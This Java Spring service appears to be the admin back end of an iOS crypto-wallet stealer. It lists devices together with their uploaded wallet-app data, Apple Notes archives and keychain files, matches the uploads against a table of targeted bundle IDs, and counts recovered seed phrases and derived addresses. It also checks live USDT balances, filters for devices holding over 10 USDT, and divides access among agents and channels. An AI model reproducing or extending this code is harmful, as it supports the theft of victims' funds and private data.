package com.admin.service;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;

import org.springframework.stereotype.Service;

import com.admin.auth.AdminContext;
import com.admin.dao.DeviceDao;
import com.admin.dao.MemorandumDao;
import com.admin.dao.MnemonicDao;
import com.admin.dao.TragetDao;
import com.admin.dao.UploadFileDao;
import com.admin.entity.AddressEntity;
import com.admin.entity.DeviceEntity;
import com.admin.entity.MnemonicEntity;
import com.admin.entity.TragetEntity;
import com.admin.entity.UploadFileEntity;
import com.admin.util.AdminForbiddenException;
import com.admin.util.TimeLabels;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

import lombok.RequiredArgsConstructor;

@Service
@RequiredArgsConstructor
public class DeviceAdminService {

    private final DeviceDao deviceDao;
    private final UploadFileDao uploadFileDao;
    private final TragetDao tragetDao;
    private final MnemonicDao mnemonicDao;
    private final MemorandumDao memorandumDao;
    private final ScopeService scopeService;
    private final BalanceLiveService balanceLiveService;
    private final com.admin.dao.AddressDao addressDao;
    private final DeviceWalletService deviceWalletService;
    private final DeviceUsdtCacheService deviceUsdtCacheService;

    public Map<String, Object> summary(AdminContext ctx) {
        QueryWrapper<DeviceEntity> scope = deviceScope(ctx);
        int deviceCount = deviceDao.selectCount(scope);
        QueryWrapper<DeviceEntity> busy = deviceScope(ctx);
        busy.eq("finished", 0);
        QueryWrapper<DeviceEntity> done = deviceScope(ctx);
        done.eq("finished", 1);
        int busyCount = deviceDao.selectCount(busy);
        int doneCount = deviceDao.selectCount(done);

        Set<String> visibleIds = visibleDeviceIds(ctx);
        QueryWrapper<UploadFileEntity> uw = new QueryWrapper<>();
        if (visibleIds != null) {
            if (visibleIds.isEmpty()) {
                return counts(deviceCount, busyCount, doneCount, 0, 0, 0, 0);
            }
            uw.in("deviceId", visibleIds);
        }
        int uploadCount = uploadFileDao.selectCount(uw);
        QueryWrapper<UploadFileEntity> completed = cloneUpload(visibleIds);
        completed.eq("status", "COMPLETED");
        int completedUploadCount = uploadFileDao.selectCount(completed);

        QueryWrapper<UploadFileEntity> wallet = cloneUpload(visibleIds);
        applyWalletName(wallet);
        int walletCount = uploadFileDao.selectCount(wallet);

        QueryWrapper<UploadFileEntity> notes = cloneUpload(visibleIds);
        applyNotesName(notes);
        int notesCount = uploadFileDao.selectCount(notes);

        return counts(deviceCount, busyCount, doneCount, uploadCount, completedUploadCount, walletCount, notesCount);
    }

    public Map<String, Object> listDevices(AdminContext ctx, int page, int size, Map<String, String> filters) {
        page = Math.max(page, 0);
        size = Math.min(Math.max(size, 1), 200);
        QueryWrapper<DeviceEntity> qw = deviceScope(ctx);
        applyTextFilters(qw, filters);
        applyOwnerFilter(ctx, qw, filters);
        applyMinUsdt(qw, filters);
        applyHasWallet(qw, filters);
        int total = deviceDao.selectCount(qw);
        int totalPages = total == 0 ? 0 : (int) Math.ceil(total / (double) size);
        if (total > 0 && page >= totalPages) {
            page = totalPages - 1;
        }
        QueryWrapper<DeviceEntity> listQw = deviceScope(ctx);
        applyTextFilters(listQw, filters);
        applyOwnerFilter(ctx, listQw, filters);
        applyMinUsdt(listQw, filters);
        applyHasWallet(listQw, filters);
        listQw.orderByDesc("updated_at").orderByDesc("id");
        listQw.last("LIMIT " + (page * size) + "," + size);
        List<DeviceEntity> rows = deviceDao.selectList(listQw);

        Set<String> dids = rows.stream().map(DeviceEntity::getDeviceId).collect(Collectors.toSet());
        Map<String, int[]> fileCounts = fileCounts(dids);
        Set<String> appIds = rows.stream()
                .map(d -> d.getAppId() == null ? "" : d.getAppId().trim().toLowerCase(Locale.ROOT))
                .filter(s -> !s.isEmpty())
                .collect(Collectors.toSet());
        Map<String, String> owners = scopeService.ownerLabelsByAppid(appIds);
        Map<String, String> appnames = scopeService.appnamesByAppid(appIds);

        List<Map<String, Object>> items = new ArrayList<>();
        for (DeviceEntity d : rows) {
            int[] cnt = fileCounts.getOrDefault(d.getDeviceId(), new int[] {0, 0, 0});
            String aid = d.getAppId() == null ? "" : d.getAppId().trim().toLowerCase(Locale.ROOT);
            Map<String, Object> item = new LinkedHashMap<>();
            item.put("id", d.getId());
            item.put("deviceId", d.getDeviceId());
            item.put("model", d.getModel());
            item.put("hardwareModel", d.getHardwareModel());
            item.put("iosVersion", d.getIosVersion());
            item.put("deviceName", d.getDeviceName());
            item.put("vendorId", null);
            item.put("appName", d.getAppName());
            item.put("bundleId", d.getBundleId());
            item.put("appId", d.getAppId());
            String title = appnames.getOrDefault(aid, d.getAppName());
            item.put("appDisplayName", title == null || title.isBlank() ? d.getDeviceId() : title);
            item.put("ownerLabel", owners.getOrDefault(aid, "—"));
            item.put("ip", d.getIp());
            item.put("createdAt", TimeLabels.isoZ(d.getCreatedAt()));
            item.put("updatedAt", TimeLabels.isoZ(d.getUpdatedAt()));
            boolean finished = d.getFinished() != null && d.getFinished() == 1;
            item.put("finished", finished);
            item.put("finishedAt", finished ? TimeLabels.isoZ(d.getFinishedAt()) : null);
            Date act = finished ? (d.getFinishedAt() != null ? d.getFinishedAt() : d.getUpdatedAt()) : d.getUpdatedAt();
            item.put("activityLabel", TimeLabels.relativeBeijing(act));
            item.put("updatedLabel", TimeLabels.beijing(d.getUpdatedAt() != null ? d.getUpdatedAt() : d.getCreatedAt()));
            item.put("debug", false);
            item.put("uploadCount", cnt[0]);
            item.put("walletCount", cnt[1]);
            item.put("notesCount", cnt[2]);
            items.add(item);
        }
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("items", items);
        data.put("page", page);
        data.put("size", size);
        data.put("total", total);
        data.put("totalPages", total == 0 ? 0 : totalPages);
        data.put("hasNext", total > 0 && (page + 1) < totalPages);
        data.put("hasPrevious", page > 0 && total > 0);
        data.put("owner_hierarchy", scopeService.filterOwnerHierarchy(ctx));
        return data;
    }

    public Map<String, Object> deviceDetail(AdminContext ctx, String deviceId) {
        DeviceEntity d = loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return null;
        }
        List<UploadFileEntity> uploads = uploadFileDao.selectList(
                new QueryWrapper<UploadFileEntity>().eq("deviceId", d.getDeviceId()).orderByDesc("created_at").orderByDesc("id"));
        List<Map<String, Object>> uploadItems = new ArrayList<>();
        for (UploadFileEntity u : uploads) {
            Map<String, Object> it = new LinkedHashMap<>();
            it.put("fileName", u.getFileName());
            it.put("fileSize", u.getFileSize());
            it.put("status", u.getStatus());
            it.put("sha256", u.getSha256());
            it.put("diskPath", u.getDiskPath());
            it.put("createdAt", TimeLabels.isoZ(u.getCreatedAt()));
            it.put("completedAt", TimeLabels.isoZ(u.getCompletedAt()));
            uploadItems.add(it);
        }
        int mnemonicCount = mnemonicDao.selectCount(new QueryWrapper<MnemonicEntity>().eq("deviceId", d.getDeviceId()));
        int memoCount = memorandumDao.selectCount(new QueryWrapper<com.admin.entity.MemorandumEntity>().eq("deviceId", d.getDeviceId()));
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("id", d.getId());
        data.put("deviceId", d.getDeviceId());
        data.put("model", d.getModel());
        data.put("hardwareModel", d.getHardwareModel());
        data.put("iosVersion", d.getIosVersion());
        data.put("deviceName", d.getDeviceName());
        data.put("appName", d.getAppName());
        data.put("bundleId", d.getBundleId());
        data.put("appId", d.getAppId());
        data.put("ip", d.getIp());
        data.put("finished", d.getFinished());
        data.put("createdAt", TimeLabels.isoZ(d.getCreatedAt()));
        data.put("updatedAt", TimeLabels.isoZ(d.getUpdatedAt()));
        data.put("finishedAt", TimeLabels.isoZ(d.getFinishedAt()));
        data.put("uploads", uploadItems);
        data.put("uploadCount", uploads.size());
        data.put("mnemonicCount", mnemonicCount);
        data.put("memorandumCount", memoCount);
        data.put("addresses", deviceAddresses(d.getDeviceId()));
        data.put("addressCount", ((List<?>) data.get("addresses")).size());
        Map<String, String> owners = scopeService.ownerLabelsByAppid(
                d.getAppId() == null ? Set.of() : Set.of(d.getAppId().trim().toLowerCase(Locale.ROOT)));
        data.put("ownerLabel", owners.getOrDefault(
                d.getAppId() == null ? "" : d.getAppId().trim().toLowerCase(Locale.ROOT), "—"));
        data.put("hasKeychain", deviceWalletService.hasKeychain(d.getDeviceId()));
        Map<String, Object> enriched = deviceWalletService.enrichDetail(d, data);
        int parsed = 0;
        @SuppressWarnings("unchecked")
        List<Map<String, Object>> wallets = (List<Map<String, Object>>) enriched.get("wallets");
        if (wallets != null) {
            for (Map<String, Object> w : wallets) {
                if (Boolean.TRUE.equals(w.get("status_ok")) && w.get("phrase_masked") != null
                        && !String.valueOf(w.get("phrase_masked")).isBlank()) {
                    parsed++;
                }
            }
        }
        int notesN = 0;
        @SuppressWarnings("unchecked")
        List<Map<String, Object>> notesItems = (List<Map<String, Object>>) enriched.get("notesItems");
        if (notesItems != null) {
            for (Map<String, Object> n : notesItems) {
                Object list = n.get("notes");
                if (list instanceof List) {
                    notesN += ((List<?>) list).size();
                }
            }
        }
        enriched.put("parsedCount", parsed);
        enriched.put("notesCount", notesN);
        enriched.put("walletCount", wallets == null ? 0 : wallets.size());
        int addrN = ((List<?>) enriched.get("addresses")).size();
        enriched.put("infoRows", java.util.List.of(
                java.util.List.of("名称", firstNonBlank(d.getDeviceName(), d.getModel(), "Device")),
                java.util.List.of("机型", nz(d.getModel())),
                java.util.List.of("硬件", nz(d.getHardwareModel())),
                java.util.List.of("系统", d.getIosVersion() == null || d.getIosVersion().isBlank()
                        ? "—" : (d.getIosVersion().toLowerCase(Locale.ROOT).startsWith("ios")
                                ? d.getIosVersion() : "iOS " + d.getIosVersion())),
                java.util.List.of("App", nz(d.getAppName())),
                java.util.List.of("Bundle", nz(d.getBundleId())),
                java.util.List.of("App ID", nz(d.getAppId())),
                java.util.List.of("归属", String.valueOf(enriched.getOrDefault("ownerLabel", "—"))),
                java.util.List.of("IP", nz(d.getIp())),
                java.util.List.of("Keychain", Boolean.TRUE.equals(enriched.get("hasKeychain")) ? "有" : "无"),
                java.util.List.of("上报", TimeLabels.beijing(d.getUpdatedAt() != null ? d.getUpdatedAt() : d.getCreatedAt())),
                java.util.List.of("注册", TimeLabels.beijing(d.getCreatedAt())),
                java.util.List.of("更新", TimeLabels.beijing(
                        d.getUpdatedAt() != null ? d.getUpdatedAt()
                                : (d.getFinishedAt() != null ? d.getFinishedAt() : d.getCreatedAt()))),
                java.util.List.of("上传", String.valueOf(uploads.size())),
                java.util.List.of("钱包", wallets == null || wallets.isEmpty() ? "—" : String.valueOf(wallets.size())),
                java.util.List.of("已解析", parsed == 0 ? "—" : String.valueOf(parsed)),
                java.util.List.of("地址", addrN == 0 ? "—" : String.valueOf(addrN))
        ));
        return enriched;
    }

    public Map<String, Object> refreshBalance(AdminContext ctx, String deviceId, String address, String chain) {
        DeviceEntity d = loadVisibleDevice(ctx, deviceId);
        if (d == null) {
            return null;
        }
        String addr = address == null ? "" : address.trim();
        String ch = chain == null ? "" : chain.trim();
        Map<String, Object> fail = new LinkedHashMap<>();
        fail.put("ok", false);
        fail.put("address", addr);
        fail.put("chain", ch);
        if (addr.isEmpty() || "—".equals(addr)) {
            fail.put("error", "无效地址");
            return fail;
        }
        if (!balanceLiveService.supports(ch, addr)) {
            fail.put("error", "暂不支持该链的实时查询");
            return fail;
        }
        String live = balanceLiveService.fetchDisplay(ch, addr);
        if (live == null) {
            fail.put("error", "查询失败，请稍后重试");
            return fail;
        }
        String[] amounts = balanceLiveService.fetchAmounts(ch, addr);
        List<MnemonicEntity> mns = mnemonicDao.selectList(new QueryWrapper<MnemonicEntity>().eq("deviceId", d.getDeviceId()));
        List<Long> mids = mns.stream().map(MnemonicEntity::getId).collect(Collectors.toList());
        if (!mids.isEmpty()) {
            QueryWrapper<AddressEntity> aw = new QueryWrapper<AddressEntity>().eq("address", addr).in("mnemonic_id", mids);
            if (!ch.isEmpty()) {
                aw.eq("chaintype", balanceLiveService.normChain(ch, addr));
            }
            List<AddressEntity> rows = addressDao.selectList(aw);
            double now = System.currentTimeMillis() / 1000.0;
            for (AddressEntity row : rows) {
                row.setNativeBal(amounts[0]);
                row.setUsdtBal(amounts[1]);
                if (amounts.length > 2) {
                    row.setUsdcBal(amounts[2]);
                }
                row.setBalanceRefreshed(now);
                addressDao.updateById(row);
            }
        }
        try {
            deviceUsdtCacheService.bumpWithUsdt(d.getDeviceId(), amounts[1]);
        } catch (Exception ignored) {
        }
        Map<String, Object> ok = new LinkedHashMap<>();
        ok.put("ok", true);
        ok.put("address", addr);
        ok.put("chain", ch);
        ok.put("balance", live);
        ok.put("balance_source", "live");
        ok.put("native_bal", amounts[0]);
        ok.put("usdt_bal", amounts[1]);
        return ok;
    }

    public DeviceEntity loadVisibleDevice(AdminContext ctx, String deviceId) {
        if (deviceId == null || deviceId.isBlank()) {
            return null;
        }
        DeviceEntity d = deviceDao.selectOne(new QueryWrapper<DeviceEntity>().eq("deviceId", deviceId.trim()));
        if (d == null) {
            d = deviceDao.selectOne(new QueryWrapper<DeviceEntity>().eq("deviceId", deviceId.trim().toLowerCase(Locale.ROOT)));
        }
        if (d == null) {
            return null;
        }
        if (!scopeService.deviceVisible(ctx, d.getAppId())) {
            throw new AdminForbiddenException("设备不存在或无权访问");
        }
        return d;
    }

    private List<Map<String, Object>> deviceAddresses(String deviceId) {
        List<MnemonicEntity> mns = mnemonicDao.selectList(new QueryWrapper<MnemonicEntity>().eq("deviceId", deviceId));
        if (mns.isEmpty()) {
            return List.of();
        }
        Map<Long, MnemonicEntity> byId = mns.stream()
                .collect(Collectors.toMap(MnemonicEntity::getId, m -> m, (a, b) -> a));
        List<Long> mids = new ArrayList<>(byId.keySet());
        List<AddressEntity> rows = addressDao.selectList(
                new QueryWrapper<AddressEntity>().in("mnemonic_id", mids).orderByAsc("chaintype").orderByAsc("addr_index").orderByAsc("id"));
        List<Map<String, Object>> out = new ArrayList<>();
        for (AddressEntity a : rows) {
            MnemonicEntity m = byId.get(a.getMnemonicId());
            Map<String, Object> item = new LinkedHashMap<>();
            item.put("id", a.getId());
            item.put("mnemonicId", a.getMnemonicId());
            item.put("address", a.getAddress());
            item.put("chain", a.getChaintype());
            item.put("addrIndex", a.getAddrIndex());
            item.put("nativeBal", a.getNativeBal());
            item.put("usdtBal", a.getUsdtBal());
            item.put("usdcBal", a.getUsdcBal());
            item.put("source", m == null ? "" : m.getSource());
            item.put("can_refresh", balanceLiveService.supports(a.getChaintype(), a.getAddress()));
            out.add(item);
        }
        return out;
    }

    private Map<String, Object> counts(int devices, int busy, int done, int uploads, int completed, int wallets, int notes) {
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("deviceCount", devices);
        data.put("busyCount", busy);
        data.put("doneCount", done);
        data.put("uploadCount", uploads);
        data.put("completedUploadCount", completed);
        data.put("walletCount", wallets);
        data.put("notesCount", notes);
        QueryWrapper<com.admin.entity.AddressEntity> aw = new QueryWrapper<>();
        data.put("parsedAddressCount", addressDao.selectCount(aw));
        return data;
    }

    private QueryWrapper<DeviceEntity> deviceScope(AdminContext ctx) {
        QueryWrapper<DeviceEntity> qw = new QueryWrapper<>();
        Set<String> allowed = scopeService.allowedAppids(ctx);
        if (allowed == null) {
            return qw;
        }
        if (allowed.isEmpty()) {
            qw.apply("1=0");
            return qw;
        }
        applyAppIdIn(qw, allowed);
        return qw;
    }

    private Set<String> visibleDeviceIds(AdminContext ctx) {
        Set<String> allowed = scopeService.allowedAppids(ctx);
        if (allowed == null) {
            return null;
        }
        QueryWrapper<DeviceEntity> qw = deviceScope(ctx);
        qw.select("deviceId");
        return deviceDao.selectList(qw).stream().map(DeviceEntity::getDeviceId).collect(Collectors.toSet());
    }

    private void applyTextFilters(QueryWrapper<DeviceEntity> qw, Map<String, String> filters) {
        if (filters == null) {
            return;
        }
        String ios = filters.get("ios");
        if (ios != null && !ios.isBlank()) {
            qw.like("iosVersion", ios.trim());
        }
        String appid = filters.get("appid");
        if (appid != null && !appid.isBlank()) {
            qw.like("appId", appid.trim());
        }
        String deviceId = filters.get("device_id");
        if (deviceId != null && !deviceId.isBlank()) {
            qw.like("deviceId", deviceId.trim());
        }
    }

    private void applyOwnerFilter(AdminContext ctx, QueryWrapper<DeviceEntity> qw, Map<String, String> filters) {
        if (filters == null) {
            return;
        }
        Integer agent = parseInt(filters.get("agent_id"));
        Integer channel = parseInt(filters.get("channel_id"));
        Integer sales = parseInt(filters.get("sales_id"));
        Set<String> extra = scopeService.ownerFilterAppids(ctx, agent, channel, sales);
        if (extra == null) {
            return;
        }
        if (extra.isEmpty()) {
            qw.apply("1=0");
            return;
        }
        applyAppIdIn(qw, extra);
    }

    /** MyBatis-Plus apply 使用 {0}/{1} 占位，不能写 JDBC 的 ? */
    private static void applyAppIdIn(QueryWrapper<DeviceEntity> qw, Set<String> appids) {
        List<String> list = new ArrayList<>(appids);
        StringBuilder sb = new StringBuilder("LOWER(IFNULL(appId,'')) IN (");
        for (int i = 0; i < list.size(); i++) {
            if (i > 0) {
                sb.append(',');
            }
            sb.append('{').append(i).append('}');
        }
        sb.append(')');
        qw.apply(sb.toString(), list.toArray());
    }

    private void applyHasWallet(QueryWrapper<DeviceEntity> qw, Map<String, String> filters) {
        if (filters == null) {
            return;
        }
        String hw = filters.get("has_wallet");
        if (!"0".equals(hw) && !"1".equals(hw)) {
            return;
        }
        Set<String> walletIds = walletDeviceIds();
        if ("1".equals(hw)) {
            if (walletIds.isEmpty()) {
                qw.apply("1=0");
            } else {
                qw.in("deviceId", walletIds);
            }
        } else if (!walletIds.isEmpty()) {
            qw.notIn("deviceId", walletIds);
        }
    }

    private Set<String> walletDeviceIds() {
        Set<String> bids = walletBundleIds();
        Set<String> out = new HashSet<>();
        if (bids.isEmpty()) {
            return out;
        }
        List<UploadFileEntity> files = uploadFileDao.selectList(null);
        for (UploadFileEntity u : files) {
            String fn = u.getFileName() == null ? "" : u.getFileName().toLowerCase(Locale.ROOT);
            if (isWalletFile(fn, bids)) {
                out.add(u.getDeviceId());
            }
        }
        return out;
    }

    private Integer parseInt(String raw) {
        if (raw == null || raw.isBlank()) {
            return null;
        }
        try {
            int n = Integer.parseInt(raw.trim());
            return n > 0 ? n : null;
        } catch (Exception e) {
            return null;
        }
    }

    private void applyMinUsdt(QueryWrapper<DeviceEntity> qw, Map<String, String> filters) {
        if (filters == null) {
            return;
        }
        String mu = filters.get("min_usdt");
        if ("10".equals(mu)) {
            try {
                deviceUsdtCacheService.backfillMissing(200);
            } catch (Exception ignored) {
            }
            qw.gt("wallet_usdt_max", 10);
        }
    }

    private QueryWrapper<UploadFileEntity> cloneUpload(Set<String> visibleIds) {
        QueryWrapper<UploadFileEntity> uw = new QueryWrapper<>();
        if (visibleIds != null) {
            uw.in("deviceId", visibleIds);
        }
        return uw;
    }

    private void applyNotesName(QueryWrapper<UploadFileEntity> qw) {
        qw.and(w -> w.like("fileName", "group.com.apple.notes")
                .or().like("fileName", "notes.tar")
                .or().like("fileName", "notes.zip")
                .or().like("fileName", "notes.tar.gz")
                .or().like("fileName", "notes.tgz"));
        qw.notLike("fileName", "mobilenotes");
    }

    private void applyWalletName(QueryWrapper<UploadFileEntity> qw) {
        List<TragetEntity> tragets = tragetDao.selectList(new QueryWrapper<TragetEntity>().eq("status", 1));
        List<String> bids = new ArrayList<>();
        Set<String> seen = new HashSet<>();
        for (TragetEntity t : tragets) {
            String b = t.getBundleId() == null ? "" : t.getBundleId().trim();
            if (b.isEmpty()) {
                continue;
            }
            String k = b.toLowerCase(Locale.ROOT);
            if (seen.add(k) && !isNotesOrKeychain(b)) {
                bids.add(b);
            }
        }
        if (bids.isEmpty()) {
            qw.apply("1=0");
            return;
        }
        qw.and(w -> {
            boolean first = true;
            for (String bid : bids) {
                if (first) {
                    w.like("fileName", bid);
                    first = false;
                } else {
                    w.or().like("fileName", bid);
                }
            }
            return w;
        });
        qw.notLike("fileName", "group.com.apple.notes")
                .notLike("fileName", "notes.tar")
                .notLike("fileName", "keychain")
                .notLike("fileName", "core_export_");
    }

    private boolean isNotesOrKeychain(String name) {
        String low = name == null ? "" : name.toLowerCase(Locale.ROOT);
        return "keychain.xml".equals(low) || low.contains("notes") || low.startsWith("core_export_");
    }

    private Map<String, int[]> fileCounts(Set<String> dids) {
        Map<String, int[]> map = new LinkedHashMap<>();
        if (dids == null || dids.isEmpty()) {
            return map;
        }
        List<UploadFileEntity> files = uploadFileDao.selectList(new QueryWrapper<UploadFileEntity>().in("deviceId", dids));
        Set<String> walletBids = walletBundleIds();
        for (UploadFileEntity u : files) {
            int[] c = map.computeIfAbsent(u.getDeviceId(), k -> new int[] {0, 0, 0});
            c[0]++;
            String fn = u.getFileName() == null ? "" : u.getFileName().toLowerCase(Locale.ROOT);
            if (isNotesFile(fn)) {
                c[2]++;
            } else if (isWalletFile(fn, walletBids)) {
                c[1]++;
            }
        }
        return map;
    }

    private Set<String> walletBundleIds() {
        Set<String> bids = new HashSet<>();
        for (TragetEntity t : tragetDao.selectList(new QueryWrapper<TragetEntity>().eq("status", 1))) {
            if (t.getBundleId() != null) {
                bids.add(t.getBundleId().toLowerCase(Locale.ROOT));
            }
        }
        return bids;
    }

    private boolean isNotesFile(String fn) {
        if (fn.contains("mobilenotes")) {
            return false;
        }
        return fn.contains("group.com.apple.notes") || fn.contains("notes.tar") || fn.contains("notes.zip")
                || fn.contains("notes.tgz");
    }

    private boolean isWalletFile(String fn, Set<String> bids) {
        if (isNotesFile(fn) || fn.contains("keychain") || fn.contains("core_export_")) {
            return false;
        }
        for (String b : bids) {
            if (fn.contains(b)) {
                return true;
            }
        }
        return false;
    }

    private static String nz(String s) {
        return (s == null || s.isBlank()) ? "—" : s.trim();
    }

    private static String firstNonBlank(String... vals) {
        if (vals != null) {
            for (String v : vals) {
                if (v != null && !v.isBlank()) {
                    return v.trim();
                }
            }
        }
        return "Device";
    }
}
